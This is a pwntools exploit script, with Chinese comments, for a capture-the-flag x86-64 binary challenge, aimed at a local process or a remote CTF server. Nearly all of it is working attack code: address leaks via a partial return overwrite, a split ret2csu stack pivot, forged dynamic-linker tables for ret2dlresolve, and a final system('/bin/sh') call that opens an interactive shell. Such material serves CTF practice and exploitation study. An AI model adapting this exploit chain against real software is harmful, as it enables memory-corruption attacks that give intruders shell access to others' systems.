#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level="debug"
pwn_file="./level5.1-ret2dlresolve_x64"
code=ELF(pwn_file)
context.arch=code.arch

libc=code.libc #ELF("/home/vam/glibc/amd64/libc.so.6")
if len(sys.argv)==1:
    r=process("./level5.1-ret2dlresolve_x64")
    pid=r.pid
else:
    r = remote("pwn.sixstars.team", 23005)
    #r=remote("pwn.sixstars.team", 23005)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

r.sendlineafter("name?\n", "I'm your father.")
# 跳转到memset之后的read地方，便于带出数据
payload = 'b'*0x28 + chr(0x7d) 
r.recvuntil("again\n")
r.sendline(payload)  # 因为readline函数，最后一个\n byte不会被读入，所以可以sendline

xuli = 'c'*0x18
r.sendline(xuli)
r.recvuntil(xuli)
stack_addr = u64(r.recvn(6)+'\x00\x00') 
info('stack_addr: %16x', stack_addr)

r.recvuntil('again\n')
r.sendline(payload)

aji = 'c'*0x10
r.sendline(aji)
r.recvuntil(aji)
code_addr = u64(r.recvn(6)+'\x00\x00')
code_base = code_addr - 0x7a0
info('code_addr: %16x', code_base)

# gadgets
rsi_r15_ret = 0xb71 + code_base
rdi_ret = 0xb73 + code_base
write_tem_pos = 0xAD7 + code_base

link_map_pos =0x201008 + code_base
bug_func = 0xA44 + code_base
main_func = 0xA2C + code_base
bss = 0x201000 + code_base
table_pos = bss+0x200
read = 0x770 + code_base
r.recvuntil("again\n\x00")

def getcsu(pre_addr, loop_addr, rbx,rbp, func_addr,rdx,rsi, rdi, ret_addr):
    csu = p64(pre_addr) + p64(rbx) + p64(rbp) + p64(func_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(loop_addr)\
    + p64(0)*7 + p64(ret_addr)
    return csu 

loop_addr = 0xB50 + code_base
pre_addr  = 0xB6A + code_base
# bx,bp,12,13,14,15
p4_ret = 0xb6d + code_base
# 0x0000000000000b6d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
ret = 0xB04 + code_base
bug_func_read = 0xAE1 + code_base
# 分两段使用ret2csu, 换栈
stack_top = 0x800 + bss  

payload_csu1 ='a'*0x28 
payload_csu1+=flat([pre_addr,0,1,code.got['read']+code_base,0x600,stack_top,0, bug_func_read]) 
r.sendline(payload_csu1)

payload_csu2  = 'a'*0x28 
payload_csu2+= p64(loop_addr)
payload_csu2+= p64(0)*7
payload_csu2+= p64(p4_ret)
payload_csu2+= p64(stack_top)
r.sendline(payload_csu2)

# gdb 得到fake_table位置为:  0x201498 + code_base
fake_table_addr = 0x201498 +0x600 + code_base
info("fake_table_addr: %16x", fake_table_addr)
binsh = fake_table_addr + 0x8

str_start = 0x460 + code_base
sym_start = 0x2C8 + code_base
jmp_rel_start = 0x640 + code_base
fake_table = 'system\x00\x00/bin/sh\x00' # string table
fake_table+= p32(fake_table_addr - str_start)+ p32(12) +p64(0)+p64(0) # sym table   
fake_table+= p64(0x201048) + p32(7)+p32((fake_table_addr+0x10-sym_start)/0x18) + p64(0) # jmp_rel 
# 借用libc_start_main位置, 由于对齐的要求，需要sym 与jmp条目都在0x18处
index = (fake_table_addr+0x10+0x18-jmp_rel_start)/0x18

fake_stack = p64(0)*3 + getcsu(pre_addr,loop_addr,0,1,code.got['write']+code_base,8,link_map_pos, 1, bug_func_read)
fake_stack+= p64(0)*0x40 + fake_table    

r.sendline(fake_stack)
link_map_addr = u64(r.recvn(8))
info("link_map_addr: %16x", link_map_addr)

link_map_re = link_map_addr + 0x1c8

payload_csu1 ='a'*0x28 
payload_csu1+=flat([pre_addr,0,1,code.got['read']+code_base,0x8,link_map_re,0, bug_func_read]) 
r.sendline(payload_csu1)

payload_csu2  = 'a'*0x28 
payload_csu2+= p64(loop_addr)
payload_csu2+= p64(0)*7
payload_csu2+= p64(bug_func_read)
r.sendline(payload_csu2)
r.send(p64(0))

PLTO = 0x710 + code_base
payload = 'a'*0x28+ p64(rdi_ret)+p64(binsh) + p64(PLTO) + p64(index)
debug()
r.sendline(payload)
r.interactive()

'''
1. 溢出长度较短，ret2csu不够: 将csu分成两段， 换栈
2. libc版本不在libc库中：使用return2dlresolve
3. (link_map + 0x1c8) = 0
4. 读入faketable
'''
